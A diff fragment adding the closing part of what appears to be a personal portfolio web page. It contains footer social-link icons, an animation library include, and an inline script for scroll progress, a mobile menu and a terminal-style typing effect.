+                            <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                    <a href="https://www.linkedin.com/in/kaulik-makwana" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill-rule="evenodd" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                    <a href="mailto:kaulik81@gmail.com" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill-rule="evenodd" d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- AOS JS -->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="/assets/js/markdown-viewer.js"></script>
+    
+    <!-- Initialize animations and interactions -->
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Initialize AOS
+        AOS.init({
+            duration: 800,
+            easing: 'ease-out',
+            once: false,
+            mirror: true
+        });
+
+        // Scroll Progress Indicator
+        window.addEventListener('scroll', () => {
+            const scrollIndicator = document.querySelector('.scroll-indicator');
+            const scrolled = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+            scrollIndicator.style.transform = `scaleX(${scrolled / 100})`;
+        });
+
+        // Mobile Menu Toggle
+        const menuButton = document.getElementById('menuButton');
+        const mobileNav = document.getElementById('mobileNav');
+        
+        if (menuButton && mobileNav) {
+            menuButton.addEventListener('click', () => {
+                menuButton.classList.toggle('active');
+                mobileNav.classList.toggle('active');
+            });
+
+            // Close menu when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!menuButton.contains(e.target) && !mobileNav.contains(e.target)) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+            });
+
+            // Close menu when scrolling
+            let lastScroll = window.scrollY;
+            window.addEventListener('scroll', () => {
+                const currentScroll = window.scrollY;
+                if (Math.abs(currentScroll - lastScroll) > 10) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+                lastScroll = currentScroll;
+            });
+        }
+
+        // Add hover effect to cards
+        document.querySelectorAll('.glass').forEach(card => {
+            card.classList.add('card-hover');
+        });
+
+        // Add button animations
+        document.querySelectorAll('a[href], button').forEach(button => {
+            if (!button.classList.contains('menu-button')) {
+                button.classList.add('btn');
+            }
+        });
+
+        // Terminal typing effect
+        function typeWriter(element, text, speed = 50) {
+            let i = 0;
+            element.textContent = '';
+            function type() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            type();
+        }
+
+        // Apply typing effect to terminal text
+        document.querySelectorAll('.terminal-text').forEach(el => {
+            const originalText = el.textContent;
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        typeWriter(el, originalText);
+                        observer.unobserve(el);
+                    }
+                });
+            });
+            observer.observe(el);
+        });
+    });
+    </script>
+</body>
+</html>
